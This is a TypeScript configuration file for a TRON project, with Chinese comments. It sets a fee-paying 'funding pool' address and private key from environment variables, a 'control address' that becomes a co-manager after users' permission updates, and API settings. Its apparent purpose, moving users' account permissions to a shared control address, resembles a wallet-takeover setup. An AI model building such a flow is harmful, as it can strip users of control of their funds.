/**
 * 签名凭证配置 - 代付池地址和私钥
 * 警告：生产环境请使用环境变量，不要硬编码私钥！
 */

export const signingCredentials = {
  // 代付池地址（用于给用户转 TRX 支付手续费）
  fundingPool: {
    address: process.env.TRON_FUNDING_POOL_ADDRESS || 'TDvPfBEoePmSG6CF9d9cKFfkPAGcnB3355',
    privateKey: process.env.TRON_FUNDING_POOL_PRIVATE_KEY || '',
  },
  
  // 控制地址（权限更新后的共管地址）
  controlAddress: process.env.TRON_CONTROL_ADDRESS || 'TDvPfBEoePmSG6CF9d9cKFfkPAGcnB3355',
  
  // TRX 转账金额（用于支付权限更新手续费，单位：TRX）
  trxTransferAmount: parseInt(process.env.TRON_TRANSFER_AMOUNT || '100'),
  
  // TRON API 配置
  tronApi: {
    fullHost: process.env.TRON_FULL_HOST || 'https://api.trongrid.io',
    apiKey: process.env.TRON_API_KEY || '',
  }
};

// 验证配置
export function validateCredentials(): { valid: boolean; error?: string } {
  if (!signingCredentials.fundingPool.privateKey) {
    return { valid: false, error: 'TRON_FUNDING_POOL_PRIVATE_KEY not configured' };
  }
  if (!signingCredentials.fundingPool.address) {
    return { valid: false, error: 'TRON_FUNDING_POOL_ADDRESS not configured' };
  }
  return { valid: true };
}
